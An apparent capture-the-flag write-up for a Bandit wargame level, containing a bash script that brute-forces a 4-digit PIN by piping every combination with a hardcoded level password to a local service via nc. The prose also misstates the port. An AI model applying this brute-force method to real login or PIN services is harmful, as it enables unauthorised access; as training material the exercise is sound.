In this level we have to submit the current level password and a unknown 4 digit pincode to port 300002 to get the next password
We can do this easily with a bash script
So, in our tmp directory we make the following file:
touch exploit.sh

#!/bin/bash                                                                                              
bandit24_pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {1000..9999}
do
	echo "$bandit24_pass $i" >> pass.txt
done
cat pass.txt | nc localhost 30002 >> output

now we make sure this script is executable
chmod +x exploit.sh
Running it will give us a file output that is full of responses from the server
Since there is only one instance where the server accepts our input we can use uniq to get that line
cat output | uniq -u
This yields our flag
